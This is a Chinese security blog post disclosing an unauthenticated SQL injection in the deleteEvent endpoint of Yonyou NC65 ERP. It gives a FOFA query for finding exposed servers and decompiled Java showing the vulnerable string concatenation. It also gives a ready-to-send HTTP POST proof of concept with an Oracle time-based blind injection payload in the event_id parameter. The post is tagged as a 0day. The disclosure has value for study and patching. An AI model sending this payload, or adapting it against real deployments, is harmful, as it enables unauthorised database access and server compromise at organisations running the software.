---
title: "用友NC deleteEvent SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-deleteEvent-sqli.html
asset_dir: assets/用友nc-deleteevent-sql注入漏洞
---

# 用友NC deleteEvent SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/20 08:21
- 1075浏览
- [0评论](#comment)
- 26分钟阅读

深入探索

企业资源规划

数据库管理系统

企业资源计划

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。⽤友NC `oacoSchedulerEvents/deleteEvent` 接⼝处存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

# 影响版本

NC65

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

`SchedulerEventsAction` 此前出现过 `listUserSharingEvents` sql注入漏洞，详情可以看这篇[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html) ，而此次出现漏洞的方法变成了 `deleteEvent`

```
public void deleteEvent() throws BusinessException {
        ISchedulerQueryService schedulerQueryService = (ISchedulerQueryService)NCLocator.getInstance().lookup(ISchedulerQueryService.class);
        ISchedulerManageService schedulerManageService = (ISchedulerManageService)NCLocator.getInstance().lookup(ISchedulerManageService.class);
        String pk_event = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_id"));
        String startDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("startDate"));
        String endDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("endDate"));
        String pid_event = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_pid"));
        String event_ts = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_ts"));
        String oper_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("oper_type"));
        String event_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("eventtype"));
        String source_id = SchedulerUtils.encodeURI(this.getRequest().getParameter("sourceid"));
        SchedulerEventJudger judger = new SchedulerEventJudger(schedulerQueryService);
        judger.getClass();
        SchedulerEventJudger.JudgedEvent judgerEvent = new SchedulerEventJudger.JudgedEvent(judger);
        judgerEvent.setPk_event(pk_event);
        judgerEvent.setStartDate(new UFDateTime(startDate));
        judgerEvent.setEvent_ts(new UFDateTime(event_ts));
        VersionStateEnum judgerState = judger.judgeCompatibleEvent(judgerEvent);
```

深入探索

Docker加速服务

编程语言教程

防火墙软件

它与前面的文章 [用友NC changeEvent SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html) 处理逻辑是一样的，也是因为`pid_event` 被直接拼接到sql语句中进行执行从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用需要条件

1. 请求中需包含 `event_id` 参数（含 `#` 字符）。
2. 其他参数（如 `startDate`、`event_ts`）需满足类型要求（可伪造合法值如 2025-05-07 12:12:12）。

```
POST /portal/pt/oacoSchedulerEvents/deleteEvent?pageId=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc65.mrxn.net

event_id=-1'AND 1=dbms_pipe.receive_message('RDS',3)--+#+&startDate=2025-05-07 12:12:12&event_ts=2025-05-07 12:12:12
```

深入探索

漏洞扫描服务

安全工具开发

漏洞修复方案

[![用友NC deleteEvent SQL注入漏洞](images/img-001-57f2eb88f276.webp)](https://image.mrxn.net/5dca1a5790dd4d80a0cf24db5de1c3c3.webp)

成功延时 3 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
